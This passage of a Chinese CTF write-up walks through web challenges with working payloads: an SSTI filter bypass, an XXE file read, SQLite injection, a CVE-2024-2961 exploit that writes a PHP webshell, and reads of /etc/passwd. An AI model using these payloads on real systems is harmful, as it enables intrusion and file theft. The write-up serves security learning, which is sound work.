class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;text&#x27;</span>,<span class="string">&#x27;md&#x27;</span>,<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>&#125;</span><br><span class="line">MAX_CONTENT_LENGTH = <span class="number">16</span> * <span class="number">1024</span> * <span class="number">1024</span>  <span class="comment"># 限制上传大小为 16MB</span></span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>] = UPLOAD_FOLDER</span><br><span class="line">app.config[<span class="string">&#x27;MAX_CONTENT_LENGTH&#x27;</span>] = MAX_CONTENT_LENGTH</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建上传目录（如果不存在）</span></span><br><span class="line">os.makedirs(UPLOAD_FOLDER, exist_ok=<span class="literal">True</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_safe_path</span>(<span class="params">basedir, path</span>):</span><br><span class="line">    <span class="keyword">return</span> os.path.commonpath([basedir,path])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">contains_dangerous_keywords</span>(<span class="params">file_path</span>):</span><br><span class="line">    dangerous_keywords = [<span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;subclasses&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>, <span class="string">&#x27;__globals__&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        file_content = <span class="built_in">str</span>(f.read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> keyword <span class="keyword">in</span> dangerous_keywords:</span><br><span class="line">            <span class="keyword">if</span> keyword <span class="keyword">in</span> file_content:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span>  <span class="comment"># 找到危险关键字，返回 True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span>  <span class="comment"># 文件内容中没有危险关键字</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">allowed_file</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">in</span> filename <span class="keyword">and</span> \</span><br><span class="line">        filename.rsplit(<span class="string">&#x27;.&#x27;</span>, <span class="number">1</span>)[<span class="number">1</span>].lower() <span class="keyword">in</span> ALLOWED_EXTENSIONS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_file</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="comment"># 检查是否有文件被上传</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;未上传文件&quot;</span>&#125;), <span class="number">400</span></span><br><span class="line"></span><br><span class="line">        file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 检查是否选择了文件</span></span><br><span class="line">        <span class="keyword">if</span> file.filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;请选择文件&quot;</span>&#125;), <span class="number">400</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 验证文件名和扩展名</span></span><br><span class="line">        <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename):</span><br><span class="line">            <span class="comment"># 安全处理文件名</span></span><br><span class="line">            filename = secure_filename(file.filename)</span><br><span class="line">            <span class="comment"># 保存文件</span></span><br><span class="line">            save_path = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], filename)</span><br><span class="line">            file.save(save_path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 返回文件路径（绝对路径）</span></span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;</span><br><span class="line">                <span class="string">&quot;message&quot;</span>: <span class="string">&quot;File uploaded successfully&quot;</span>,</span><br><span class="line">                <span class="string">&quot;path&quot;</span>: os.path.abspath(save_path)</span><br><span class="line">            &#125;), <span class="number">200</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;文件类型错误&quot;</span>&#125;), <span class="number">400</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># GET 请求显示上传表单（可选）</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    &lt;!doctype html&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;Upload File&lt;/title&gt;</span></span><br><span class="line"><span class="string">    &lt;h1&gt;Upload File&lt;/h1&gt;</span></span><br><span class="line"><span class="string">    &lt;form method=post enctype=multipart/form-data&gt;</span></span><br><span class="line"><span class="string">      &lt;input type=file name=file&gt;</span></span><br><span class="line"><span class="string">      &lt;input type=submit value=Upload&gt;</span></span><br><span class="line"><span class="string">    &lt;/form&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/file/&lt;path:filename&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">view_file</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 1. 过滤文件名</span></span><br><span class="line">        safe_filename = secure_filename(filename)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> safe_filename:</span><br><span class="line">            abort(<span class="number">400</span>, description=<span class="string">&quot;无效文件名&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 2. 构造完整路径</span></span><br><span class="line">        file_path = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], safe_filename)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 3. 路径安全检查</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> is_safe_path(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], file_path):</span><br><span class="line">            abort(<span class="number">403</span>, description=<span class="string">&quot;禁止访问的路径&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 4. 检查文件是否存在</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.isfile(file_path):</span><br><span class="line">            abort(<span class="number">404</span>, description=<span class="string">&quot;文件不存在&quot;</span>)</span><br><span class="line"></span><br><span class="line">        suffix=os.path.splitext(filename)[<span class="number">1</span>]</span><br><span class="line">        <span class="built_in">print</span>(suffix)</span><br><span class="line">        <span class="keyword">if</span> suffix==<span class="string">&quot;.jpg&quot;</span> <span class="keyword">or</span> suffix==<span class="string">&quot;.png&quot;</span> <span class="keyword">or</span> suffix==<span class="string">&quot;.gif&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> send_from_directory(<span class="string">&quot;static/uploads/&quot;</span>,filename,mimetype=<span class="string">&#x27;image/jpeg&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> contains_dangerous_keywords(file_path):</span><br><span class="line">            <span class="comment"># 删除不安全的文件</span></span><br><span class="line">            os.remove(file_path)</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Waf!!!!&quot;</span>&#125;), <span class="number">400</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            file_data = f.read().decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        tmp_str = <span class="string">&quot;&quot;&quot;&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">        &lt;html lang=&quot;zh&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;head&gt;</span></span><br><span class="line"><span class="string">            &lt;meta charset=&quot;UTF-8&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;title&gt;查看文件内容&lt;/title&gt;</span></span><br><span class="line"><span class="string">        &lt;/head&gt;</span></span><br><span class="line"><span class="string">        &lt;body&gt;</span></span><br><span class="line"><span class="string">            &lt;h1&gt;文件内容：&#123;name&#125;&lt;/h1&gt;  &lt;!-- 显示文件名 --&gt;</span></span><br><span class="line"><span class="string">            &lt;pre&gt;&#123;data&#125;&lt;/pre&gt;  &lt;!-- 显示文件内容 --&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            &lt;footer&gt;</span></span><br><span class="line"><span class="string">                &lt;p&gt;&amp;copy; 2025 文件查看器&lt;/p&gt;</span></span><br><span class="line"><span class="string">            &lt;/footer&gt;</span></span><br><span class="line"><span class="string">        &lt;/body&gt;</span></span><br><span class="line"><span class="string">        &lt;/html&gt;</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span>.<span class="built_in">format</span>(name=safe_filename, data=file_data)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> render_template_string(tmp_str)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        app.logger.error(<span class="string">f&quot;文件查看失败: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br><span class="line">        abort(<span class="number">500</span>, description=<span class="string">&quot;文件查看失败:&#123;&#125; &quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(e)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 错误处理（可选）</span></span><br><span class="line"><span class="meta">@app.errorhandler(<span class="params"><span class="number">404</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">not_found</span>(<span class="params">error</span>):</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&quot;error&quot;</span>: error.description&#125;, <span class="number">404</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(<span class="params"><span class="number">403</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">forbidden</span>(<span class="params">error</span>):</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&quot;error&quot;</span>: error.description&#125;, <span class="number">403</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(<span class="string">&quot;0.0.0.0&quot;</span>,debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p><strong>文件上传+SSTI</strong><br>注意因为这里会<code>return</code>，所以我们选择其他后缀<code>ALLOWED_EXTENSIONS = &#123;&#39;txt&#39;, &#39;log&#39;, &#39;text&#39;,&#39;md&#39;,&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;&#125;</code></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> suffix==<span class="string">&quot;.jpg&quot;</span> <span class="keyword">or</span> suffix==<span class="string">&quot;.png&quot;</span> <span class="keyword">or</span> suffix==<span class="string">&quot;.gif&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> send_from_directory(<span class="string">&quot;static/uploads/&quot;</span>,filename,mimetype=<span class="string">&#x27;image/jpeg&#x27;</span>)</span><br></pre></td></tr></table></figure><p>然后我们借助我们的老朋友<strong>fenjing</strong>跑一个<strong>payload</strong>出来</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> fenjing <span class="keyword">import</span> exec_cmd_payload, config_payload</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line">logging.basicConfig(level=logging.INFO)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">s: <span class="built_in">str</span></span>):  <span class="comment"># 如果字符串s可以通过waf则返回True, 否则返回False</span></span><br><span class="line">    blacklist = [<span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;subclasses&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>, <span class="string">&#x27;__globals__&#x27;</span>, <span class="string">&#x27;flag&#x27;</span>]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">all</span>(word <span class="keyword">not</span> <span class="keyword">in</span> s <span class="keyword">for</span> word <span class="keyword">in</span> blacklist)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    shell_payload, _ = exec_cmd_payload(waf, <span class="string">&quot;cat /flag&quot;</span>)</span><br><span class="line">    <span class="comment"># config_payload = config_payload(waf)</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;shell_payload=&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="comment"># print(f&quot;&#123;config_payload=&#125;&quot;)</span></span><br></pre></td></tr></table></figure><p>然后就是抓包改一个文件名<code>xxx.md</code>，内容为上面的<code>payload</code>，之后<strong>访问<code>/file/xxx.md</code></strong></p><h2 id="gt-﹏-lt"><a href="#gt-﹏-lt" class="headerlink" title="(&gt;﹏&lt;)"></a>(&gt;﹏&lt;)</h2><p><strong>无过滤<code>xxe</code></strong><br><code>curl -X POST http://node2.anna.nssctf.cn:28796/ghctf --data-urlencode &#39;xml=&lt;!DOCTYPE root [&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot;&gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt;&#39;</code></p><h2 id="SQL"><a href="#SQL" class="headerlink" title="SQL???"></a>SQL???</h2><p><code>id=1 order by 6</code>判断列数为5，然后习惯性查<code>database()</code>，没查到，原来是<strong>sqlite注入</strong>(题目算个提示)</p><p><code>id=1 union select 1,2,3,4,(select sql from sqlite_master)--</code>，查到表名和列名</p><p><code>id=1 union select 1,2,3,4,(select group_concat(flag) from flag)--</code>，查到数据</p><p><code>emmm</code>，据说<code>sqlmap</code>的话要开<code>--random-agent</code>，好防，我好像也没跑出来</p><h2 id="ez-readfile"><a href="#ez-readfile" class="headerlink" title="ez_readfile"></a>ez_readfile</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] != <span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]) &#123;</span><br><span class="line">          <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">is_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">              <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>奇怪，网上找的字符串，强碰撞<code>yakit,bp</code>这些都发包不成功导致了读不到文件，然后下面是当时打<code>SHCTF2024</code><strong>fastcoll</strong>生成的文件</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;D:\\ctf-learning\\Misc_learning\\fastcoll\\sh_msg1.txt&quot;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    a = f.read()</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;D:\\ctf-learning\\Misc_learning\\fastcoll\\sh_msg2.txt&quot;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    b = f.read()</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;a&#x27;</span>: a,</span><br><span class="line">    <span class="string">&#x27;b&#x27;</span>: b</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://node2.anna.nssctf.cn:28002/?file=/etc/passwd&quot;</span></span><br><span class="line">res = requests.post(url, data=data)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure><p>通过<code>file_get_contents</code>实现命令执行，可以参考这篇去年5月份就发的<a href="https://mp.weixin.qq.com/s/03Bq8iryo22Cme5QR0LqDw">cve-2024-2961</a>，然后是<a href="https://www.cnblogs.com/EddieMurphy-blogs/p/18296185">春秋杯夏季赛</a>，说实话不关注这些东西，真不好在网上慢慢找</p><p>这里用到的是<a href="https://github.com/kezibei/php-filter-iconv">kezibei的脚本</a><br>修改一下payload，<code>cmd = &quot;echo &#39;&lt;?php system($_GET[\&quot;cmd\&quot;]); ?&gt;&#39; &gt; /var/www/html/shell.php&quot;</code></p><p>这里我们需要有<code>maps</code>和<code>libc.so</code>(路径翻一下前者即可得到)文件(跟上面的脚本放在同一目录下即可)，前者直接下载复制保存即可，后者因为响应里面还有页面信息，而且内容较大，得保存到文件中，再删除掉文件前面的东西即可</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># maps</span></span><br><span class="line">url = <span class="string">&quot;http://node2.anna.nssctf.cn:28002/?file=/proc/self/maps&quot;</span></span><br><span class="line">res = requests.post(url, data=data)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc.so</span></span><br><span class="line">url = <span class="string">&quot;http://node2.anna.nssctf.cn:28002/?file=/lib/x86_64-linux-gnu/libc-2.31.so&quot;</span></span><br><span class="line">res = requests.post(url, data=data)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;D:\\ctf-learning\\CVE\\cve-2024-2961-LFI\\php-filter-iconv\\libc-2.31.so&quot;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(res.content)</span><br></pre></td></tr></table></figure><p>然后在有<strong>pwn环境的主机</strong>中运行<code>php-filter-iconv.py</code>即可，我这里用的是<strong>wsl2+ubuntu22.04</strong>，把<code>payload</code>打入上面的<code>exp</code>，访问题目<strong>url/shell.php?cmd=cat /f*</strong>即可</p><p>看了官方<code>wp</code>，居然有非预期<br><img src="https://pic1.zhimg.com/80/v2-4acc0d17eeae51da2f768b337c31295c_1440w.png" alt=""><br>读取，<strong>/docker-entrypoint.sh</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Check the environment variables for the flag and assign to INSERT_FLAG</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$DASFLAG</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    INSERT_FLAG=<span class="string">&quot;<span class="variable">$DASFLAG</span>&quot;</span></span><br><span class="line"><span class="keyword">elif</span> [ <span class="string">&quot;<span class="variable">$FLAG</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    INSERT_FLAG=<span class="string">&quot;<span class="variable">$FLAG</span>&quot;</span></span><br><span class="line"><span class="keyword">elif</span> [ <span class="string">&quot;<span class="variable">$GZCTF_FLAG</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    INSERT_FLAG=<span class="string">&quot;<span class="variable">$GZCTF_FLAG</span>&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    INSERT_FLAG=<span class="string">&quot;flag&#123;TEST_Dynamic_FLAG&#125;&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将FLAG写入文件 请根据需要修改</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$INSERT_FLAG</span> &gt; /f1wlxekj1lwjek1lkejzs1lwje1lwesjk1wldejlk1wcejl1kwjelk1wjcle1jklwecj1lkwcjel1kwjel1cwjl1jwlkew1jclkej1wlkcj1lkwej1lkcwjellag</span><br><span class="line"></span><br><span class="line"><span class="built_in">source</span> /etc/apache2/envvars</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Running...&quot;</span> &amp;</span><br><span class="line"></span><br><span class="line"><span class="built_in">tail</span> -F /var/log/apache2/* &amp;</span><br><span class="line"></span><br><span class="line"><span class="built_in">exec</span> apache2 -D FOREGROUND</span><br></pre></td></tr></table></figure><h2 id="ezzzz-pickle"><a href="#ezzzz-pickle" class="headerlink" title="ezzzz_pickle"></a>ezzzz_pickle</h2><p>直接爆破<strong>admin</strong>的密码得到<strong>admin123</strong></p><p><code>POST</code>参数发现可以<strong>任意文件读取</strong>，我们直接读<strong>源文件/app/app.py</strong><br>页面源代码还给了个提示，<strong>session_pickle</strong></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># /app/app.py</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, redirect, make_response,render_template</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.ciphers <span class="keyword">import</span> Cipher, algorithms, modes</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.backends <span class="keyword">import</span> default_backend</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives <span class="keyword">import</span> padding</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_key_iv</span>():</span><br><span class="line">    key = os.environ.get(<span class="string">&#x27;SECRET_key&#x27;</span>).encode()</span><br><span class="line">    iv = os.environ.get(<span class="string">&#x27;SECRET_iv&#x27;</span>).encode()</span><br><span class="line">    <span class="keyword">return</span> key, iv</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_encrypt_decrypt</span>(<span class="params">data, key, iv, mode=<span class="string">&#x27;encrypt&#x27;</span></span>):</span><br><span class="line"></span><br><span class="line">    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> mode == <span class="string">&#x27;encrypt&#x27;</span>:</span><br><span class="line">        encryptor = cipher.encryptor()</span><br><span class="line"></span><br><span class="line">        padder = padding.PKCS7(algorithms.AES.block_size).padder()</span><br><span class="line">        padded_data = padder.update(data.encode()) + padder.finalize()</span><br><span class="line">        result = encryptor.update(padded_data) + encryptor.finalize()</span><br><span class="line">        <span class="keyword">return</span> base64.b64encode(result).decode()  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> mode == <span class="string">&#x27;decrypt&#x27;</span>:</span><br><span class="line">        decryptor = cipher.decryptor()</span><br><span class="line"></span><br><span class="line">        encrypted_data_bytes = base64.b64decode(data)</span><br><span class="line">        decrypted_data = decryptor.update(encrypted_data_bytes) + decryptor.finalize()</span><br><span class="line"></span><br><span class="line">        unpadder = padding.PKCS7(algorithms.AES.block_size).unpadder()</span><br><span class="line">        unpadded_data = unpadder.update(decrypted_data) + unpadder.finalize()</span><br><span class="line">        <span class="keyword">return</span> unpadded_data.decode()</span><br><span class="line"></span><br><span class="line">users = &#123;</span><br><span class="line">    <span class="string">&quot;admin&quot;</span>: <span class="string">&quot;admin123&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_session</span>(<span class="params">username</span>):</span><br><span class="line"></span><br><span class="line">    session_data = &#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>: username,</span><br><span class="line">        <span class="string">&quot;expires&quot;</span>: time.time() + <span class="number">3600</span>  </span><br><span class="line">    &#125;</span><br><span class="line">    pickled = pickle.dumps(session_data)</span><br><span class="line">    pickled_data = base64.b64encode(pickled).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    key,iv=generate_key_iv()</span><br><span class="line">    session=aes_encrypt_decrypt(pickled_data, key, iv,mode=<span class="string">&#x27;encrypt&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> session</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dowload_file</span>(<span class="params">filename</span>):</span><br><span class="line">    path=os.path.join(<span class="string">&quot;static&quot;</span>,filename)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data=f.read().decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">validate_session</span>(<span class="params">cookie</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        key, iv = generate_key_iv()</span><br><span class="line">        pickled = aes_encrypt_decrypt(cookie, key, iv,mode=<span class="string">&#x27;decrypt&#x27;</span>)</span><br><span class="line">        pickled_data=base64.b64decode(pickled)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        session_data = pickle.loads(pickled_data)</span><br><span class="line">        <span class="keyword">if</span> session_data[<span class="string">&quot;username&quot;</span>] !=<span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> session_data <span class="keyword">if</span> session_data[<span class="string">&quot;expires&quot;</span>] &gt; time.time() <span class="keyword">else</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;session&quot;</span> <span class="keyword">in</span> request.cookies:</span><br><span class="line">        session = validate_session(request.cookies[<span class="string">&quot;session&quot;</span>])</span><br><span class="line">        <span class="keyword">if</span> session:</span><br><span class="line">            data=<span class="string">&quot;&quot;</span></span><br><span class="line">            filename=request.form.get(<span class="string">&quot;filename&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span>(filename):</span><br><span class="line">                data=dowload_file(filename)</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>,name=session[<span class="string">&#x27;username&#x27;</span>],file_data=data)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&quot;/login&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        username = request.form.get(<span class="string">&quot;username&quot;</span>)</span><br><span class="line">        password = request.form.get(<span class="string">&quot;password&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> users.get(username) == password:</span><br><span class="line">            resp = make_response(redirect(<span class="string">&quot;/&quot;</span>))</span><br><span class="line"></span><br><span class="line">            resp.set_cookie(<span class="string">&quot;session&quot;</span>, create_session(username))</span><br><span class="line">            <span class="keyword">return</span> resp</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;login.html&quot;</span>,error=<span class="string">&quot;Invalid username or password&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;login.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span 